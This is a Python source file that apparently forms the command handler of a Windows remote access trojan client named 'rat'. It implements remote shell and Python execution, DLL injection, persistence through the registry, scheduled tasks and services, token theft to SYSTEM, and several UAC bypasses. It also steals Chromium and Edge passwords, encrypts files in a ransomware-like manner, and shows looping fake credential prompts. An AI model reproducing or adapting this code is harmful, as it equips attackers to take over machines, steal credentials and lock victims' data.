import contextlib
import inspect
import io
import json
import os
import subprocess
import time
from functools import wraps
from pathlib import Path

from client.util import *
from common.util import parse_args, logger, parse, get_time

if os.name == 'nt':
    import winreg
    from client.win32util import *

    INTEGRITY_LEVEL = get_integrity_level()
    EXECUTABLE_PATH = get_exec_path()
    lpApplicationName, lpCommandLine = get_exec_info()


def desc(text):
    """ 命令帮助 """

    def attr_decorator(func):
        setattr(func, 'help', text)
        return func

    return attr_decorator


def params(arg_list):
    """ 参数 """

    def attr_decorator(func):
        @wraps(func)
        def wrapper(*args, **kwargs):
            # 函数参数字典
            arg_dict = parse_args(arg_list, args[0])
            # 遍历
            for key in arg_dict:
                # 设置函数属性
                setattr(func, key, arg_dict[key])
            # 将对函数自身的引用添加到函数的第一个参数
            return func(func, *args, **kwargs)

        # 保留函数原始参数
        wrapper.__signature__ = inspect.signature(func)
        return wrapper

    return attr_decorator


def enclosing(func):
    """ 外层函数 """

    def wrapper(*args):
        # 嵌套函数
        nested_funcs = func(*args)
        # 函数参数
        arg_str = args[0]
        # 嵌套函数列表
        if not arg_str:
            return 1, format_dict_with_index({k: v.help for k, v in nested_funcs.items() if hasattr(v, 'help')})
        # 拆分函数参数
        name, arg = parse(arg_str)
        # 根据序号获取嵌套函数
        nested_funcs = {k: v for k, v in nested_funcs.items() if callable(v)}
        nested_func = None
        try:
            index = int(name)
            nested_func = list(nested_funcs.items())[index][1]
        except:
            # 根据嵌套函数名获取嵌套函数
            if name in nested_funcs and callable(nested_funcs[name]):
                nested_func = nested_funcs[name]
        finally:
            if not nested_func:
                return 0, 'no such function: {}'.format(name)
                # 获取嵌套函数参数个数
            if len(inspect.getfullargspec(nested_func).args):
                return nested_func(arg)
            else:
                return nested_func()

    wrapper.__signature__ = inspect.signature(func)
    return wrapper


def require_admin(func):
    """ 检查管理员权限 """

    def wrapper(*args):
        if ctypes.windll.shell32.IsUserAnAdmin():
            return func(*args)
        else:
            return 0, 'administrator rights required'

    wrapper.__signature__ = inspect.signature(func)
    return wrapper


def require_integrity(level):
    """ 检查进程权限 """

    def attr_decorator(func):
        @wraps(func)
        def wrapper(*args):
            if level == INTEGRITY_LEVEL:
                return func(*args)
            else:
                return 0, '{} integrity level required'.format(level)

        wrapper.__signature__ = inspect.signature(func)
        return wrapper

    return attr_decorator


class Command:
    server = None

    @staticmethod
    def pass_server(server):
        Command.server = server

    @staticmethod
    def _cmdlist():
        return 1, json.dumps([cmd for cmd in vars(Command) if hasattr(getattr(Command, cmd), 'help')])

    @staticmethod
    @desc('show this help')
    def help():
        """ 显示帮助菜单 """
        return 1, format_dict(
            {k: getattr(Command, k).help for k, v in vars(Command).items() if hasattr(getattr(Command, k), 'help')})

    @staticmethod
    @desc('change directory')
    def cd(path):
        """ 切换目录 """
        if not path:
            return 1, ''
        if os.path.isdir(path):
            os.chdir(path)
            return 1, ''
        else:
            return 0, 'Cannot find the path specified'

    @staticmethod
    @desc('execute shell command')
    def shell(command):
        """ 执行shell命令 """
        cmd = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                               stdin=subprocess.DEVNULL)
        stdout = str(cmd.stdout.read(), locale.getdefaultlocale()[1])
        stderr = str(cmd.stderr.read(), locale.getdefaultlocale()[1])
        if stdout:
            return 1, stdout
        elif stderr:
            return 0, stderr
        else:
            return 1, ''

    @staticmethod
    def run(command):
        if not command:
            return 0, ''
        p = subprocess.Popen(command, creationflags=subprocess.CREATE_NEW_CONSOLE)
        return 1, 'Process created: {}'.format(p.pid)

    @staticmethod
    @desc('download file')
    def download(server, filename):
        """ 发送文件 """
        if os.path.isfile(filename):
            server.send_file(filename)
        else:
            server.send_result(0, 'File does not exist')

    @staticmethod
    @desc('inject DLL into process')
    @params(['pid', 'dll_path'])
    def inject(this, args):
        """ 远程线程注入 """
        if not os.path.isfile(this.dll_path):
            return 0, 'File does not exist: {}'.format(this.dll_path)
        return create_remote_thread(int(this.pid), os.path.abspath(this.dll_path))

    @staticmethod
    @desc('execute python code')
    def pyexec(code, args=None):
        """ 执行Python代码 """
        if args is None:
            args = {}
        f = io.StringIO()
        with contextlib.redirect_stdout(f), contextlib.redirect_stderr(f):
            exec(code, args)
        return 1, f.getvalue()

    @staticmethod
    @desc('grab a screenshot')
    def screenshot(server):
        """ 截图 """
        import pyautogui
        filename = 'screenshot_{}.png'.format(get_time())
        pyautogui.screenshot(filename)
        server.send_file(filename)

    @staticmethod
    @desc('get information')
    def getinfo():
        """ 获取客户端信息 """
        import psutil
        import platform
        info = {}
        try:
            info['pid'] = os.getpid()
            info['hostname'] = platform.node()
            info['os'] = platform.platform()
            info['username'] = psutil.Process().username()
            info['integrity'] = INTEGRITY_LEVEL
            info['exec_path'] = EXECUTABLE_PATH
        except Exception as e:
            logger.error(e)
        finally:
            return 1, format_dict(info)

    @staticmethod
    @require_integrity('Medium')
    @desc('ask for uac elevation')
    def askuac():
        """ 请求权限提升 """
        import win32api
        if not ctypes.windll.shell32.IsUserAnAdmin():
            result = ctypes.windll.shell32.ShellExecuteW(None, 'runas', lpApplicationName, lpCommandLine, None, 1)
            if result > 32:
                return 1, ''
            else:
                return 0, str(result) + ', ' + win32api.FormatMessage(result)
        else:
            return 0, ''

    @staticmethod
    @desc('detect user inactive time')
    def idletime():
        """ 获取用户闲置时间 """
        import win32api
        return 1, 'User has been idle for: {} seconds'.format(
            (win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0)

    @staticmethod
    @desc('perform emergency shutdown')
    def poweroff():
        """ 快速关机 """
        ctypes.windll.ntdll.RtlAdjustPrivilege(19, 1, 0, ctypes.byref(ctypes.c_bool()))
        ctypes.windll.ntdll.ZwShutdownSystem(2)

    @staticmethod
    @desc('apply persistence mechanism')
    @enclosing
    def persist(args):
        """ 添加开机启动项 """

        @desc('create registry key')
        def registry(option):
            """ 注册表 """
            if not option:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_WRITE)
                winreg.SetValueEx(key, 'rat', 0, winreg.REG_SZ, EXECUTABLE_PATH)
                winreg.CloseKey(key)
                return 1, 'registry key created'
            elif option == '--undo':
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Software\Microsoft\Windows\CurrentVersion\Run', 0,
                                     winreg.KEY_WRITE)
                winreg.DeleteValue(key, 'rat')
                winreg.CloseKey(key)
                return 1, 'registry key removed'
            else:
                return 0, 'unknown option: {}'.format(option)

        @desc('schedule task')
        @require_admin
        def schtasks(option):
            """ 计划任务 """
            if not option:
                return Command.shell(
                    f'schtasks.exe /create /tn rat /sc onlogon /ru system /rl highest /tr "{EXECUTABLE_PATH}" /f')
            elif option == '--undo':
                return Command.shell('schtasks.exe /delete /tn rat /f')
            else:
                return 0, 'unknown option: {}'.format(option)

        @desc('create service')
        @require_admin
        def service(option):
            """ 服务 """
            if not option:
                return Command.shell(f'sc create rat binpath="{EXECUTABLE_PATH}" start= auto')
            elif option == '--undo':
                return Command.shell('sc delete rat')
            else:
                return 0, 'unknown option: {}'.format(option)

        return locals()

    @staticmethod
    @desc('duplicate token from process')
    @enclosing
    def stealtoken(args):
        """ 窃取进程令牌 """

        @desc('run as system')
        @require_admin
        def system():
            enable_privilege('SeDebugPrivilege')
            pid = create_process_with_token(duplicate_token(get_process_token(get_pid('winlogon.exe'))),
                                            lpApplicationName, lpCommandLine)
            return 1, 'Process created: {}'.format(pid)

        @desc('run as trusted installer')
        @require_integrity('System')
        def ti():
            enable_privilege('SeDebugPrivilege')
            start_service('TrustedInstaller')
            h_token = duplicate_token(get_process_token(get_pid('TrustedInstaller.exe')))
            pid = create_process_with_token(h_token, lpApplicationName, lpCommandLine)
            return 1, 'Process created: {}'.format(pid)

        @desc('bypass session 0 isolation and run as user')
        @require_integrity('System')
        def user():
            enable_privilege('SeTcbPrivilege')
            h_token = duplicate_token(get_user_token())
            pid = create_process_as_user(h_token, lpApplicationName, lpCommandLine)
            return 1, 'Process created: {}'.format(pid)

        @desc('bypass session 0 isolation and run as admin')
        @require_integrity('System')
        def admin():
            enable_privilege('SeTcbPrivilege')
            h_token = duplicate_token(get_linked_token(get_user_token()))
            pid = create_process_as_user(h_token, lpApplicationName, lpCommandLine)
            return 1, 'Process created: {}'.format(pid)

        return locals()

    @staticmethod
    @desc('elevate as admin without uac prompt')
    @enclosing
    def uac(args):
        """ Bypass UAC """

        @desc('trusted binary')
        @require_integrity('Medium')
        def fodhelper():
            reg_path = r'Software\Classes\ms-settings\shell\open\command'
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, EXECUTABLE_PATH)
            winreg.SetValueEx(key, 'DelegateExecute', 0, winreg.REG_SZ, '')
            p = subprocess.Popen(r'C:\Windows\System32\fodhelper.exe', shell=True)
            p.communicate()
            winreg.SetValueEx(key, None, 0, winreg.REG_SZ, '')
            winreg.DeleteValue(key, 'DelegateExecute')
            winreg.CloseKey(key)
            return 1, 'success'

        @desc('.net profiler dll')
        @require_integrity('Medium')
        def clr():
            server = Command.server
            filename = 'bypassuac_dotnet.dll'
            dll_name = Path(EXECUTABLE_PATH).stem + '.dll'
            if not os.path.isfile(dll_name):
                if not server.request_file(filename):
                    return
                os.rename(filename, dll_name)
            dll_path = os.path.abspath(dll_name)
            reg_path = r'Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32'
            winreg.CreateKey(winreg.HKEY_CURRENT_USER, reg_path)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, None, 0, winreg.REG_EXPAND_SZ, dll_path)
            winreg.CloseKey(key)
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'COR_PROFILER', 0, winreg.REG_SZ, '{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}')
            winreg.SetValueEx(key, 'COR_PROFILER_PATH', 0, winreg.REG_SZ, dll_path)
            winreg.SetValueEx(key, 'COR_ENABLE_PROFILING', 0, winreg.REG_SZ, '1')
            p = subprocess.Popen('mmc eventvwr.msc', shell=True)
            p.communicate()
            winreg.DeleteValue(key, 'COR_PROFILER')
            winreg.DeleteValue(key, 'COR_PROFILER_PATH')
            winreg.DeleteValue(key, 'COR_ENABLE_PROFILING')
            winreg.CloseKey(key)
            return 1, 'success'

        @desc('disk cleanup scheduled task')
        @require_integrity('Medium')
        def diskcleanup():
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 'Environment', 0, winreg.KEY_WRITE)
            winreg.SetValueEx(key, 'windir', 0, winreg.REG_SZ, EXECUTABLE_PATH + ' ;')
            p = subprocess.Popen(r'schtasks.exe /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /i', shell=True)
            p.communicate()
            winreg.DeleteValue(key, 'windir')
            winreg.CloseKey(key)
            return 1, 'success'

        @desc('install inf file')
        @require_integrity('Medium')
        def cmstp():
            import tempfile
            inf_template = r'''
[version]
Signature=$chicago$
AdvancedINF=2.5
[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection
[RunPreSetupCommandsSection]
{}
[CustInstDestSectionAllUsers]
49000,49001=AllUSer_LDIDSection, 7
[AllUSer_LDIDSection]
"HKLM", "SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE", "ProfileInstallPath", "%UnexpectedError%", ""
[Strings]
ServiceName="flcVPN"
ShortSvcName="flcVPN"
            '''.format(EXECUTABLE_PATH)
            inf_path = os.path.join(tempfile.gettempdir(), 'tmp.inf')
            with open(inf_path, 'w') as f:
                f.write(inf_template)
            p = subprocess.Popen(r'C:\Windows\System32\cmstp.exe "{}" /au'.format(inf_path))
            time.sleep(1)
            hwnd = ctypes.windll.user32.FindWindowW(None, 'flcVPN')
            if not hwnd:
                raise Exception('unable to detect window')
            if not ctypes.windll.user32.SetForegroundWindow(hwnd):
                raise Exception('unable to activate window')
            if not ctypes.windll.user32.keybd_event(0x0D, 0, 0, 0):
                raise Exception('unable to send keyboard event to window')
            time.sleep(5)
            psutil.Process(p.pid).kill()
            os.remove(inf_path)
            return 1, 'success'

        return locals()

    @staticmethod
    @desc('extract data from browser')
    @params(['browser', 'data'])
    def browser(this, args):
        """ 提取浏览器数据 """
        home = os.path.expanduser('~')
        profile_paths = {
            'chrome': os.path.join(home, r'AppData\Local\Google\Chrome\User Data'),
            'edge': os.path.join(home, r'AppData\Local\Microsoft\Edge\User Data'),
        }
        profile_path = profile_paths.get(this.browser)
        if not profile_path:
            return 0, 'not supported: {}'.format(this.browser)
        if not os.path.isdir(profile_path):
            return 0, 'not installed: {}'.format(this.browser)
        local_state = os.path.join(profile_path, 'Local State')
        default = os.path.join(profile_path, r'Default')
        login_data = os.path.join(default, 'Login Data')
        bookmarks = os.path.join(default, 'Bookmarks')
        history = os.path.join(default, 'History')
        if this.data == 'password':
            return 1, json.dumps(get_chromium_passwords(get_master_key(local_state), login_data),
                                 sort_keys=False,
                                 indent=2,
                                 ensure_ascii=False)
        elif this.data == 'bookmark':
            return 1, json.dumps(get_chromium_bookmarks(bookmarks), indent=2, ensure_ascii=False)
        elif this.data == 'history':
            return 1, json.dumps(get_chromium_history(history), sort_keys=False, indent=2, ensure_ascii=False)
        else:
            return 0, 'unknown data: {}'.format(this.data)

    @staticmethod
    def encrypt(path):
        """ 加密文件 """
        import tempfile, base64
        from Crypto.Random import get_random_bytes
        key = get_random_bytes(32)
        with open(os.path.join(tempfile.gettempdir(), 'key'), 'wb') as f:
            f.write(base64.b64encode(key))
        if os.path.isfile(path):
            encrypt_file(path, key)
            return 1, f'key: {base64.b64encode(key).decode()}'
        elif os.path.isdir(path):
            result = []
            for root, subdirs, files in os.walk(path):
                for filename in files:
                    try:
                        encrypt_file(os.path.join(root, filename), key)
                    except Exception as e:
                        result.append(str(e))
            return 1, f'key: {base64.b64encode(key).decode()}\n{chr(10).join(result)}'
        else:
            return 0, 'No such file or directory'

    @staticmethod
    @params(['path', 'key'])
    def decrypt(this, args):
        """ 解密文件 """
        import base64
        key = base64.b64decode(this.key)
        if os.path.isfile(this.path):
            decrypt_file(this.path, key)
            return 1, ''
        elif os.path.isdir(this.path):
            result = []
            for root, subdirs, files in os.walk(this.path):
                for filename in files:
                    try:
                        decrypt_file(os.path.join(root, filename), key)
                    except Exception as e:
                        result.append(str(e))
            return 1, '\n'.join(result)
        else:
            return 0, 'No such file or directory'

    @staticmethod
    @desc('prompt for credentials')
    @enclosing
    def cred(args):

        @desc('PSHostUserInterface.PromptForCredential')
        def pshostui():
            while True:
                p = subprocess.Popen(
                    'powershell.exe '
                    '$cred=$Host.UI.PromptForCredential(\'\',\'\',$env:username,\'\');'
                    'if($cred) {echo $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password} else {echo `n}',
                    stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
                stdout, stderr = p.communicate()
                if stderr:
                    return 0, stderr.decode(locale.getdefaultlocale()[1])
                lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
                if logon_user(*lines):
                    return 1, str(lines)

        @desc('CredentialPicker')
        def credpicker():
            server = Command.server
            filename = 'Cred.ps1'
            if not os.path.isfile(filename):
                if not server.request_file(filename):
                    return
            filename = os.path.abspath(filename)
            p = subprocess.Popen(r'powershell.exe -ep bypass -file "{}"'.format(filename), stdout=subprocess.PIPE,
                                 stderr=subprocess.PIPE, shell=True)
            stdout, stderr = p.communicate()
            if stderr:
                server.send_result(0, stderr.decode(locale.getdefaultlocale()[1]))
                return
            lines = stdout.decode(locale.getdefaultlocale()[1]).splitlines()
            server.send_result(1, str(lines))

        @desc('switch to new desktop')
        def swdesk():
            try:
                create_desktop()
                while True:
                    status, result = create_process(
                        r'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe',
                        ' $cred=$Host.UI.PromptForCredential(\'\',\'\',$env:username,\'\');'
                        'if($cred) {echo $cred.GetNetworkCredential().UserName $cred.GetNetworkCredential().Password} else {echo `n}')
                    if not status:
                        raise Exception(result)
                    lines = result.splitlines()
                    if logon_user(*lines):
                        switch_default()
                        return 1, f'username: {lines[0]}\npassword: {lines[1]}'
            except:
                switch_default()
                raise

        return locals()
